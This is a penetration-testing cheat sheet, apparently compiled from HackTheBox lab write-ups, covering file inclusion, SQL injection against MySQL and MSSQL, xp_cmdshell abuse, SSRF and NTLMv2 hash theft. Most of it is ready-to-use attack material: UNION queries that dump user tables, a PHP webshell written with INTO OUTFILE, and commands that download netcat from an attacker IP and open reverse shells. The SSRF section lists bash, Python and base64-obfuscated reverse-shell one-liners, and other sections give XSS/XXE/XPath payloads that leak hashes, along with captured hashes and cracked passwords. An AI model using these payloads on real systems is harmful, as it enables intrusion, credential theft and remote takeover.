


# Directory Traversal

<details>
<summary>Example</summary>
<ul><li>This dropdown contains</li>
<li>a list!</li></ul>
</details>

## Hints of existence

200 instead of 404 - I tested by visiting /0xdf (a path that won’t exist), and could see in Burp the response was a 200:

You might need to port forward on SSH if site is only accessible from localhost or allows login only from localhost

## Local File Inclusion

On a Linux box, I’d try to read` /etc/passwd`. Since this is Windows, I’ll try `C:\windows\system32\drivers\etc\hosts`

try with / instead of \, make sure to use an absolute path,

## Remote File Inclusion

https://0xdf.gitlab.io/2023/05/06/htb-flight.html#rfi-test

1. First we try to host our file on a HTTP server and include it from target

2. If not able to run code we can get the NTLMv2 hash by getting hit on responder, then we can crack it to get password+

if our code is not run then we can simply start responder and hit it to get NTLMv2 hash which we can crack to get password

If not able to

## Common Exploits

### PHP

http://testwesitee.com/test.php?file= ?

If we have above type of URL where we can specify path in query string parameter (ex: file=) then we need to figure out that whether its just reading file or actually including it.

1. Create a dummy PHP file named poc.txt and upload it
```
<?php echo '0xdf was here'; ?>
```

The source must using `Include` function behind then it will actually execute our file bu its using `file_get_contents` function behind then it will simply read content of our file.

### file_get_contents

![alt text](https://0xdf.gitlab.io/img/image-20221025115340005.png)

If we are getting just the content of our file then its using `file_get_contents`, which mean it wont process our file.

We can still use this to get NTLMv2 hash.

#### Get NTLMv2 hash

[More](https://0xdf.gitlab.io/2023/05/06/htb-flight.html#rfi-test)

Another way to include a file is over SMB. It won’t get anything that HTTP couldn’t get as far as execution, but the user will try to authenticate, and I could capture a NetNTLMv2 challenge/response

start responder with `sudo responder -I tun0`, and then visit` http://school.flight.htb/index.php?view=//10.10.14.6/share/poc.txt`. We see There’s a hit:

```
 [SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.187
 [SMB] NTLMv2-SSP Username : flight\svc_apache
 [SMB] NTLMv2-SSP Hash     : svc_apache::flight:94b09791c5d8b6d8:C0D8ADF3A8B29E39F6A26C6D6F403994:010100000000000000075CBED7EAD8015F3F9144FFADCA9900000000020008004A0031004E00560001001E00570049004E002D003700470057005600330057004B00330030004100460004003400570049004E002D003700470057005600330057004B0033003000410046002E004A0031
 [*] Skipping previously captured hash for flight\svc_apache
 [*] Skipping previously captured hash for flight\svc_apache
```



# SQL  Injection

## MySQL

https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/

### Fuzz 
```
,') or 1=1;-- 
```
(having a space in the query might mess things, so we can try using comments instead of spaces It’s important to switch from the -- - comment to #, as the former requires a space to make the comment, and I’m testing without spaces (--/**/- will not work).)
```
')/**/or/**/1=1#    
```
### Union Based

https://0xdf.gitlab.io/2023/10/14/htb-intentions.html#sql-injection-manual

To do a UNION injection, I’ll need to know the number of columns naturally returned from the query so I can UNION on that same number of columns of data to leak.

Since in Json respone we are getting,  at least six things returned (id, file, genre, created_at, udpated_at, and url), through url could be generated from file, so maybe only five items. I’ll try five like this: 
```
')/**/UNION/**/SELECT/**/1,2,3,4,5#
```
Now I can use that template to make queries into the database. Where I have “2” and “3” are the only things that can take strings, so I’ll focus there. If I replace “2” with “user()” and “3” with “database()”, it shows the results:
```
{
    "status":"success",
    "data":[
        {
            "id":10,
            "file":"laravel@localhost",
         	"genre":"intentions",
         	"created_at":"1970-01-01T00:00:04.000000Z",
         	"updated_at":"1970-01-01T00:00:05.000000Z",
         	"url":"\/storage\/laravel@localhost"
        }
    ]
}
```

 I’ll use version() to get the version of 10.6.12-MariaDB-0ubuntu0.22.04.1.

 Now I’ll change genres to get the list of databases and tables

```
')/**/UNION/**/SELECT/**/1,table_schema,table_name,4,5/**/from/**/information_schema.tables/**/where/**/table_schema/**/!=/**/'information_schema'#
```
This will get the database name in the file and the table name in the genre of the output

The only database we got intentions, and there are four tables: gallery_images, personal_access_tokens, migrations, and users.

The most immediately interesting table is users. I’ll update my genres to list the columns in that table:

```
')/**/UNION/**/SELECT/**/1,2,column_name,4,5/**/from/**/information_schema.columns/**/where/**/table_name='users'#
```
This returns id, name, email, password, created_at, updated_at, and genres. I’ll update my query to get all of the interesting information in one column using concat:
```
')/**/UNION/**/SELECT/**/1,2,concat(name,':',email,':',admin,':',password,':',genres),4,5/**/from/**/users#
```

### Upload webshell
```
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
```

## MSSQL

### Fuzz Payloads
```
`
-- -

;-- -

```



### Union Based

1. Confirm number of columns either by Order by or adding null/1
```
# Try increasing nuber untill you stop getting result

' ORDER BY 1-- -        --> data
' ORDER BY 2-- -        --> data
' ORDER BY 3-- -        --> data
' ORDER BY 4-- -        --> error

```
```
# Try adding 1 or Null untill you stop getting results - this will be actully confirm the number of columns

abcd' union select 1;-- -                   ---> data

abcd' union select 1,2,3,4,5,6 --           ---> data

abcd' union select 1,2,3,4,5,6,7 --         ---> error
```
3. Now since we have number of columns confirmed lets start gettin data

**Get DB Version**
```
abcd' union select 1,@@version,3,4,5,6 --
```
**Get Databases**
```
abcd' union select 1,name,DB_NAME(),4,5,6 from master..sysdatabases;-- -
```


```
#

```

### xp_dirtree - Get NTLMv2 hash

Get NTLMv2 hash using stacked queries

https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#ntlm-hash---dead-end


Got Direct SQL injection, since -- was working, assuming its iether MSSQL or MYSQL gave a query

abcd' union select 1,2,3,4,5,6 --           ---> 2

abcd' union select 1,@@version,3,4,5,6 --   ----> Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)

Start responder on network interface ang give below query
```
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0
```
Now give payload xp_dirtree 

abcd'; use master; exec xp_dirtree '\\10.10.14.2\share';-- -

```
[+] Listening for events...                                                                                                                                                                  

[SMB] NTLMv2-SSP Client   : 10.10.11.158
[SMB] NTLMv2-SSP Username : streamIO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::streamIO:12fc86cc73fa2c0d:0122EAF87B459FFD21E13ADB80E4E22A:010100000000000000C81484B29BDB01089790C79B91F1FF0000000002000800530043005000380001001E00570049004E002D005A00520054004500430041004500450036004100440004003400570049004E002D005A0052005400450043004100450045003600410044002E0053004300500038002E004C004F00430041004C000300140053004300500038002E004C004F00430041004C000500140053004300500038002E004C004F00430041004C000700080000C81484B29BDB01060004000200000008003000300000000000000000000000003000004D9B4EFC963737B77D6CE6F9168A87462075797759D7A0E7840493B04B3042450A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000 
```

Unfortunately, because this is a machine account, it’s very unlikely to be crackable. I can try with hashcat, but it won’t crack.

**get the current DB, Tables and username and paswords**
https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#get-passwords

1. list dbs

abcd' UNION select 1,name,3,4,5,6 from master..sysdatabases-- -

> master, model, msdb, and tempdb are all MSSQL system DBs.So our current DB is STREAMIO

2. Lets look at the tables from STREAMIO

abcd' UNION select 1,name,3,4,5,6 from STREAMIO..sysobjects-- -

cn' UNION select 1,name,3,4,5,6 from STREAMIO..sysobjects WHERE xtype = 'U'-- -

> we got one Users table in it

3. We can check the column names in it with:

abcd' UNION select 1,name,3,4,5,6 from STREAMIO..syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')-- -

> we got columns id, is_staff, username, password

4. Lets now grab the usernames:

abcd' UNION select 1,username,3,4,5,6 from STREAMIO..Users-- -

5. Lets now grab the passwords

abcd' UNION select 1,password,3,4,5,6 from STREAMIO..Users-- -

>Cool, so it looks like we’ve got about 30 usernames and hashes. Lets see if we can crack these hashes using hashcat

``
┌──(kali㉿kali)-[~]
└─$ hashcat hashes -m0 ~/Downloads/rockyou.txt --force --show
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
3577c47eb1e12c8ba021611e1280753c:highschoolmusical
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
665a50ac9eaa781e4f7f04199db97a11:paddpadd
6dcd87740abb64edfa36d170f0d5450d:$3xybitch
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
cc03e747a6afbbcbf8be7668acfebee5:test123
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
ef8f3d30a856cf166fb8215aca93e9ff:%$clara
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$

``
### xp_dirtree

https://0xdf.gitlab.io/2024/03/16/htb-manager.html#enumeration-as-operator

xp_dirtree is feature for listing files on the filesystem.
```
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   
Documents and Settings          1      0   
inetpub                         1      0   
PerfLogs                        1      0   
Program Files                   1      0   
Program Files (x86)             1      0   
ProgramData                     1      0   
Recovery                        1      0   
SQL2019                         1      0   
System Volume Information       1      0   
Users                           1      0   
Windows                         1      0 
```
### xp_cmdshell

xp_cmdshell is feature in MSSQL to run commands on the system.
```
- Basic command execution
- Uploading file
- Get Reverse Shell
- Example
```
**Basic command execution**

```
SQL (MANAGER\Operator  guest@master)> xp_cmdshell whoami
[-] ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```
You might get access error as above - but we can try to enable it by 2 ways
```
# 1. try using enable_xp_cmdshell and then again try to execute command

SQL (MANAGER\Operator  guest@master)> enable_xp_cmdshell
SQL (MANAGER\Operator  guest@master)> xp_cmdshell whoami

# 2. Try below

SQL> EXECUTE sp_configure 'show advanced options', 1
[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> EXECUTE sp_configure 'xp_cmdshell', 1
[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> xp_cmdshell whoami

```

**Uploading file**
```
SQL> exec xp_cmdshell "powershell -c iwr http://10.10.14.6/nc64.exe -outfile C:\programdata\nc64.exe
```

**Get Reverse Shell**

[More](https://0xdf.gitlab.io/2025/04/05/htb-ghost.html#database-execution)

Upload netcat
```
SQL> exec xp_cmdshell "powershell -c iwr http://10.10.14.6/nc64.exe -outfile C:\programdata\nc64.exe
```
run it
```
SQL> exec xp_cmdshell "C:\programdata\nc64.exe 10.10.14.6 443 -e powershell
```
OR
```
SQL> exec xp_cmdshell 'c:\programdata\PrintSpoofer64.exe -c "c:\programdata\nc64.exe 10.10.14.6 443 -e cmd"'
```
we get a shell as the mssqlserver service.
```
oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.24 49874
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
nt service\mssqlserver
```

**Example**

[More](https://medium.com/@alokkumar0200/owning-a-machine-using-xp-cmdshell-via-sql-injection-manual-approach-a380a5e2a340)

Finding Number of Columns in database.
```
admin' UNION SELECT 1,2,3,4,5--+
```
Check if we can run stack queries. (This should bring a delay of 8 seconds in response.)
```
admin' UNION SELECT 1,2,3,4,5; WAITFOR DELAY '0:0:8'--+
```
Below query can be used to check our privileges if we can enable xp_cmdshell via SQL Injection (Result of above query should be 1)
```
admin' UNION SELECT 1,is_srvrolemember('sysadmin'),3,4,5--+
```
Below queries will configure xp_cmdshell for us.
```
admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'show advanced options', 1--+
admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1--+
admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
```
Check if we can execute OS commands or not. Let’s ping our Burp Collaborator, query should give us a DNS request on Burp Collaborator. (ngrok can also be used if you don’t have Burp Suite Professional).
```
admin' UNION SELECT 1,2,3,4,5; EXEC xp_cmdshell 'ping <collab_url>.burpcollaborator.net'--+
```
Getting Shell
Created a meterpreter staged payload using msfvenom and hosted it on local server which will finally land us to the SHELL. And started listener on metasploit. Using below query to get the our payload from local server and execute it on victim’s machine.
```
admin' UNION SELECT 1,2; EXEC xp_cmdshell 'mshta.exe http://<attacker_IP>:8000/shell.hta'--+
```



#### Privilege Escalation

[More](https://0xdf.gitlab.io/2021/11/06/htb-pivotapi.html#shortcut-2)

##### SeImpersonatePrivileges

Check priv
```
SQL> exec xp_cmdshell 'whoami /priv'
```
We can use the Alamot MSSQL shell to upload the `PrintSpoofer binary`
```
SQL> exec xp_cmdshell "powershell -c iwr http://10.10.14.6/PrintSpoofer64.exe -outfile C:\programdata\PrintSpoofer64.exe
```
Now we run it and escalate privileges and run commands as machine account
```
SQL> exec xp_cmdshell 'c:\programdata\PrintSpoofer64.exe -c "cmd /c whoami >\programdata\output"'
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
NULL
SQL> exec xp_cmdshell 'type \programdata\output"'
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
licordebellota\pivotapi$
NULL  
```
This same idea can be used to fetch the flag from elevated account directory
```
SQL> exec xp_cmdshell 'c:\programdata\PrintSpoofer64.exe -c "cmd /c type C:\users\cybervaca\desktop\root.txt  >\programdata\output"'
```

https://0xdf.gitlab.io/2022/10/01/htb-scrambled-beyond-root.html#get-execution-via-mssql

https://0xdf.gitlab.io/2021/11/06/htb-pivotapi.html#shortcut-2

Reverse shell - https://0xdf.gitlab.io/2025/04/05/htb-ghost.html#database-execution

### mssqlclient.py

https://0xdf.gitlab.io/2024/03/16/htb-manager.html#enumeration-as-operator

mssqlclient.py will connect, using the -windows-auth flag to say that it’s using the OS authentication, not creds within the DB
```
mssqlclient.py -windows-auth manager.htb/operator:operator@manager.htb
```
```
oxdf@hacky$ mssqlclient.py -windows-auth manager.htb/operator:operator@manager.htb
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)>
```

### Enumeration

#### List Files

xp_dirtree is another feature for listing files on the filesystem.

In below example we found an xml file in web directory which eventually had password
```
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   
Documents and Settings          1      0   
inetpub                         1      0   
PerfLogs                        1      0   
Program Files                   1      0   
Program Files (x86)             1      0   
ProgramData                     1      0   
Recovery                        1      0   
SQL2019                         1      0   
System Volume Information       1      0   
Users                           1      0   
Windows                         1      0 

SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1  
```
We then grab the archive from the webserver
```
oxdf@hacky$ wget http://manager.htb/website-backup-27-07-23-old.zip
```
And extract it:
```
oxdf@hacky$ unzip website-backup-27-07-23-old.zip -d webbackup/
```
The first file, .old-conf.xml is interesting. It has an LDAP configuration for the raven user including a password:
```
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```
We can now winrm using this

[More](https://0xdf.gitlab.io/2024/03/16/htb-manager.html#enumeration-as-operator)

#### Privilege Check

In below example we found that The service is running as scrm\sqlsvc, which does have SeImpersonate, which we can exploit using Potato attack in this case it was exploited using JuicyPotatoNG.
```
SQL> xp_cmdshell whoami
scrm\sqlsvc

SQL> xp_cmdshell whoami /priv
output
--------------------------------------------------------------------------------
NULL
PRIVILEGES INFORMATION
----------------------
NULL
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
NULL
```

[More](https://0xdf.gitlab.io/2022/10/01/htb-scrambled-beyond-root.html#privilege-check)

## SQLMAP

https://0xdf.gitlab.io/2019/06/08/htb-help.html#sqlmap

```
sqlmap -r ticket_attachment.request --level 5 --risk 3 -p param[]
```

### Second Order SQLi

https://0xdf.gitlab.io/2023/10/14/htb-intentions.html#sql-injection-sqlmap

Save request setting genres without any injection and only a single genre to a file, genres.request.
Save a request fetching the user feed to a file, feed.request.

```
sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5
```


# SSRF
https://0xdf.gitlab.io/2024/01/06/htb-sau.html#shell-as-puma

## Confirm SSRF
```
- Confirm using your HTTP server
- Test using Burp Collaborater
```
**Test Using your PHP server**

start your php server

```
┌──(kali㉿kali)-[~/php]
└─$ php -S 10.10.16.7:9393
[Thu Mar 20 23:11:18 2025] PHP 8.2.24 Development Server (http://10.10.16.7:9393) started
```

host code for port scan - can be used with burp intruder
```
┌──(kali㉿kali)-[~/php]
└─$ cat file.php    
<?php header('location:127.0.0.1:'.$_REQUEST[x]); ?>
```

/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1

bash -i >& /dev/tcp/10.10.16.3/443 0>&1

`echo+"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43LzM0MzQgMD4mMQ=="+|+base64+-d+|+bash`

python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.7",3939));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'

username=;`echo+\"cHl0aG9uMyAtYyBcJ2ltcG9ydCBzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjciLDM5MzkpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKVwn\"+|+base64+-d+|+sh`

0<&196;exec 196<>/dev/tcp/10.10.16.7/3434; sh <&196 >&196 2>&196

## Port Scan
```
- Scan internal ports using Burp collaborater
- Scan using Fuff
```

**fuff**



# STEALING NET-NTLMv2 HASHES

https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#

#### RFI

The include() in PHP will resolve the network path for us.

```
http://host.tld/?page=//11.22.33.44/@OsandaMalith
```

![alt text](https://i0.wp.com/osandamalith.com/wp-content/uploads/2017/03/lfi.png?ssl=1)

#### XSS

injecting the following javascript into the webpage

```
<script language='javascript' src="\\10.10.14.15\share"></script>
```

Now, on loading the page, When the target user enters creds, they come back as a ntlmv2 to responder

![alt text](https://0xdfimages.gitlab.io/img/1547379369762.webp)


#### XXE

In here I’m using “php://filter/convert.base64-encode/resource=” that will resolve a network path.

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=//11.22.33.44/@OsandaMalith" >
]>
<root>
  <name></name>
  <tel></tel>
  <email>OUT&xxe;OUT</email>
  <password></password>
</root>
```

![alt text](https://i0.wp.com/osandamalith.com/wp-content/uploads/2017/03/xxe.png?ssl=1)

#### XPATH Injection

Usually, doc() is used in out-of-band XPath injections, thus can be applied in resolving a network path.

```
http://host.tld/?title=Foundation&type=*&rent_days=* and doc('//35.164.153.224/@OsandaMalith')
```

![alt text](https://i0.wp.com/osandamalith.com/wp-content/uploads/2017/03/xpath.png?ssl=1)


#### MySQL Injection

http://host.tld/index.php?id=1’ union select 1,2,load_file(‘\\\\192.168.0.100\\@OsandaMalith’),4;%00

![alt text](https://i0.wp.com/osandamalith.com/wp-content/uploads/2017/02/overinternet.png?ssl=1)


#### MSSQL Injection

Get NTLMv2 hash using stacked queries

https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#ntlm-hash---dead-end


Got Direct SQL injection, since -- was working, assuming its iether MSSQL or MYSQL gave a query

abcd' union select 1,2,3,4,5,6 --           ---> 2

abcd' union select 1,@@version,3,4,5,6 --   ----> Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)

Start responder on network interface ang give below query
```
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0
```
Now give payload xp_dirtree 

abcd'; use master; exec xp_dirtree '\\10.10.14.2\share';-- -

```
[+] Listening for events...                                                                                                                                                                  

[SMB] NTLMv2-SSP Client   : 10.10.11.158
[SMB] NTLMv2-SSP Username : streamIO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::streamIO:12fc86cc73fa2c0d:0122EAF87B459FFD21E13ADB80E4E22A:010100000000000000C81484B29BDB01089790C79B91F1FF0000000002000800530043005000380001001E00570049004E002D005A00520054004500430041004500450036004100440004003400570049004E002D005A0052005400450043004100450045003600410044002E0053004300500038002E004C004F00430041004C000300140053004300500038002E004C004F00430041004C000500140053004300500038002E004C004F00430041004C000700080000C81484B29BDB01060004000200000008003000300000000000000000000000003000004D9B4EFC963737B77D6CE6F9168A87462075797759D7A0E7840493B04B3042450A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000 
```



![alt text]

![alt text]
![alt text]
![alt text]



# Log Poison

https://0xdf.gitlab.io/2024/09/07/htb-mailing.html#poison-log


# Interesting Files

## PHP

You may find credentials in here for example - https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html#enumeration

/var/www/html/crm.board.htb/htdocs/conf/
/var/www/html/crm.board.htb/htdocs/conf/conf.php



# Code Execution

**PHP**

[More](https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html#cve-2023-30253)

If there is an input in which we can submit php code and see it on another web page we can try it with phpinfo
```
<?php phpinfo(); ?>
```

# Default 404 pages

https://0xdf.gitlab.io/cheatsheets/404#